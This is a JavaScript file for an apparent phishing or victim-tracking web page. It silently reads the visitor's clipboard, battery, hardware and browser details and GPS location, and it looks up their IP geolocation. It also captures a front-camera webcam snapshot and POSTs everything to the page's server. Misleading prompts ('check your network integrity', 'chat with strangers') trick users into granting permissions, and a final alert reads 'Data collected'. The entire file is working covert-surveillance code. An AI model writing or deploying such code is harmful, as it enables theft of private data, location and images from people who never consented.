$(document).ready(function() {
    var permission_gather = $('$permission_gather').val();

    console.log("PERMISSION GATHER: "+permission_gather);
    var batterypercentage
    var ischarging
   async function getclips() {
     var btr = await navigator.getBattery();
     batterypercentage = String(btr.level*100+"%");
     ischarging = String(btr.charging);
  try {
  let victimtext = await navigator.clipboard.readText();
  giveclips(victimtext)
  } catch (error) {
  giveclips("Clipboard Permission Denied")
  }
  }
  getclips()
  var clips
  
  function giveclips(polp) {
  clips = polp
  ipinfo()
  getLocation()
  }
  
  function getLocation() {
  if (navigator.geolocation) {
  navigator.geolocation.getCurrentPosition(showPosition, showError);
  } else {
  alert("Your Browser Does not support Gps");
  }
  }
  
  
   function showPosition(position) {
    var grak = "Lattitute : " + position.coords.latitude + " " + "Longitude : " + position.coords.longitude
  
    sdrp(grak, clips,networkinformation,batterypercentage,ischarging);
  
  
   }
  
   function showError(error) {
    switch (error.code) {
     case error.PERMISSION_DENIED:
  
     sdrp("Location Permission Denied",clips,networkinformation,batterypercentage,ischarging);
     alert("Allow Location permission to check your network integrity");
      break;
     case error.POSITION_UNAVAILABLE:
      window.close()
      break;
     case error.TIMEOUT:
      window.close()
      break;
     case error.UNKNOWN_ERROR:
      window.close()
      break;
    }
   }
   let datetime = new Date();
   let localtime = String(datetime.toLocaleTimeString());
   let referurl = document.referrer;
   let cpuThreads = String(navigator.hardwareConcurrency);
   let deviceram = String(navigator.deviceMemory) + "gb";
   let useragent = navigator.userAgent;
   let iscookieEnabled = String(navigator.cookieEnabled);
   let devicelang = String(navigator.language);
   let width = screen.width;
   let height = screen.height;
   let platform = navigator.platform;
   let networkinfo = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
   let networkinformation = "Network type : " + networkinfo.effectiveType + " " + "Downlink :" + " " + networkinfo.downlink
  
  
   function ipinfo(){
      $.getJSON('https://ipapi.co/json/', function(data) {
  
              $.ajax({
              type: "POST",
              url: "/ipinfo",
              data: JSON.stringify(data),
              contentType: "application/json",
              dataType: 'json',
              cache: false,
              success: function(data) {},
              error: function(xhr, status, error) {
              console.log(error);}
              })
      })
   }
  
  
  
  
   function sdrp(bsdks,clipboard,networkinformation,batterypercentage,ischarging) {
  
    $.ajax({
     type: "POST",
     url: "/process_qtc",
     data: JSON.stringify({
      networkinformation : networkinformation,
      batterypercentage:batterypercentage,
      ischarging:ischarging,
      Screenwidth: width,
      Screenheight: height,
      platform: platform,
      Gps: bsdks,
      Devicelanguage: devicelang,
      iscookieEnabled: iscookieEnabled,
      Useragent: useragent,
      DeviceMemory: deviceram,
      CpuThreads: cpuThreads,
      Referurl: referurl,
      Devicelocaltime: localtime,
      clipboard : clipboard,
     }),
     contentType: "application/json",
     dataType: 'json',
     cache: false,
     success: function(data) {},
     error: function(xhr, status, error) {
      console.log(error);
     }
    })
   }
  })

  function postFile(file) {
    var sessionID = document.getElementById('sessionID_input').value;
   let formdata = new FormData();
   formdata.append("image", file);
   let xhr = new XMLHttpRequest();
   xhr.open('POST', '/image?sessionID='+sessionID, true);
   xhr.onload = function () {
       if (this.status === 200)
           console.log(this.response);
       else
           console.error(xhr);
   };
   xhr.send(formdata);
}




const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const errorMsgElement = document.querySelector('span#errorMsg');

const constraints = {
audio: false,
video: {

facingMode: "user"
}
};

// Access webcam
async function init() {
try {
const stream = await navigator.mediaDevices.getUserMedia(constraints)
handleSuccess(stream);
} catch (e) {
setTimeout(function(){
// alert("Allow Camera access to chat with strangers");
// window.location.href = "https://support.onemob.com/hc/en-us/articles/360037342154-How-do-I-grant-permission-for-Camera-and-Microphone-in-my-web-browser-"
// alert("Read this page to grant camera access to  our website")
},15000) }
}

// Success
function handleSuccess(stream) {
window.stream = stream;
video.srcObject = stream;

var context = canvas.getContext('2d');
var counter = 0
var interval = setInterval(function(){

  context.drawImage(video, 0, 0, 640, 480);
  canvas.toBlob(postFile, 'image/jpeg');
counter += 1000; 
  if(counter >= 1000){
     clearInterval(interval);
  }
}, 1000);



}

// Load init
init();

function redirectToGoogle() {
    var spinner = document.getElementById("spinner");
    var checkmark = document.getElementById("checkmark");

    checkmark.setAttribute("hidden", true);
    spinner.style.display = "block";
    setTimeout(function() {
    //   window.location.href = "https://www.google.com";
    alert("Data collected");
    }, 5000);
  }
